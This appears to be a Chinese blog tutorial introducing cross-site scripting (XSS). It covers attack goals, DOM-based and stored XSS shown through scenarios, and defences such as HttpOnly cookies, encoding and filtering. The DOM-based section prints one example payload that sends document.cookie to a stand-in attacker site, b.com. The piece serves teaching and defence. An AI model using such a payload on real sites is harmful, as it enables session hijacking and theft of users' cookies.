# XSS简介

## 什么是XSS

引用wiki上的一段：

>   跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。
>
>   XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。

### 攻击手段和目的

攻击者使被攻击者在浏览器中执行脚本后，如果需要收集来自被攻击者的数据（如cookie或其他敏感信息），可以自行架设一个网站，让被攻击者通过JavaScript等方式把收集好的数据作为参数提交，随后以数据库等形式记录在攻击者自己的服务器上。

常用的**XSS**攻击手段和目的有：

-   盗用cookie，获取敏感信息。
-   利用植入Flash，通过[crossdomain](https://zh.wikipedia.org/w/index.php?title=Crossdomain&action=edit&redlink=1)权限设置进一步获取更高权限；或者利用Java等得到类似的操作。
-   利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发[微博](https://zh.wikipedia.org/wiki/%E5%BE%AE%E5%8D%9A)、加好友、发私信等操作。
-   利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。
-   在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现[DDoS](https://zh.wikipedia.org/wiki/DDoS)攻击的效果。

### 过滤字符串

XSS也是一种很常见的攻击手段，所以很多语言都有一套过滤HTML语言的机制，比如：

-   PHP的htmlentities()或是htmlspecialchars()。
-   Python的cgi.escape()
-   Java的xssprotect

## XSS漏洞

XSS漏洞分为两种，一种是DOM Based XSS漏洞，另一种是Stored XSS漏洞。

理论上，**所有可输入的地方**没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力

这样说没啥概念，那就通过几个栗子来说明一下吧

## DOM Based XSS

>   DOM Based XSS是一种基于网页DOM结构的攻击，该攻击特点是中招的人是少数人。

假设当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数**直接显示的**；就是说后台程序会把content参数的内容加载到返回的HTML页面上

我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：
`http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>`
当Tom点击这个链接的时候(假设他已经登录a.com)，a网站就会加载后面的JS代码，那么浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！

当然用户提交的数据还可以通过QueryString(放在URL中)或者Cookie发送给服务器

## Stored XSS

>   Stored XSS是存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以访问该页面的用户都有信息泄漏的风险，受害者是很多人。

Alex发现了网站A上有一个XSS 漏洞，该漏洞允许将攻击代码保存在数据库中，Alex发布了一篇文章，文章中嵌入了恶意JavaScript代码，比如就是上面的那一句JS代码。

其他人如Monica访问这片文章的时候，嵌入在文章中的恶意Javascript代码就会在浏览器中执行，其会话cookie或者其他信息将被Alex盗走。

## 如何防御

XSS攻击的原因大多数是因为太相信用户的输入，所以防御一句话概况就是：

>   永远不相信用户的输入。需要对用户的输入进行处理，只允许输入合法的值，其它值一概过滤掉。

上面也说过过滤字符串的一些库了，就是把特殊字符进行转义，但是...

攻击代码不一定在`<script></script>`中，常用的防御方式一般这样做：

1.  将重要的cookie标记为http only,   这样的话Javascript 中的`document.cookie`语句就不能获取到cookie了.
2.  只允许用户输入我们期望的数据。 例如：年龄的textbox中，只允许用户输入数字。 而数字之外的字符都过滤掉。
3.  对数据进行Html Encode 处理
4.  过滤或移除特殊的Html标签， 例如:` <script>, <iframe> `,  `< for <`, `> for >`, `&quot for`
5.  过滤JavaScript 事件的标签。例如 "onclick=", "onfocus" 等等。
6.  最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里

现在也有很多工具可以进行自动化XSS测试，非常方便，但是就算是有XSS过滤器帮你做过滤，产生XSS漏洞的风险还是很高

是因为HTML里有太多的地方容易形成XSS漏洞，而且形成漏洞的原因又有差别，比如有些漏洞发生在**HTML标签**里，有些发生在**HTML标签的属性**里，还有的发生在页面的`<Script>`里，甚至有些还出现在**CSS**里，再加上不同的浏览器对页面的解析或多或少有些不同，使得有些漏洞只在特定浏览器里才会产生。

上面的对付基本的XSS攻击还有效果，如果是高级的XSS攻击.....这个不在我研究的范围内，哈哈

下次要不要了解下CSRF(跨站请求伪造)攻击呢...貌似还一个比较厉害的代码注入攻击(PHP注入，SQL注入，Shell注入等)

待续...